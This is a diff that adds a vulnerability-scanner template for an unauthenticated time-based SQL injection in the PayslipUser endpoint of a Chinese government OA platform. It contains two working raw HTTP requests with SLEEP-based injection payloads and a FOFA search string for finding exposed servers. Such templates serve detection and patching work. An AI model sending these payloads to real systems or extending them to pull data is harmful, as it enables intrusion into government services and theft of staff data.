@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%284%29%29%29usQE%29 HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%288%29%29%29usQE%29 HTTP/1.1
+          Host: {{Hostname}}
+id: shuzitongyun-OA_PayslipUser-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
+        数字通云平台智慧政务OA PayslipUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 数字通云平台 智慧政务OA PayslipUser SQL注入漏洞
+    reference:
+        - https://superhero.blog.csdn.net/article/details/140617970
+    severity: high
+    tags: []
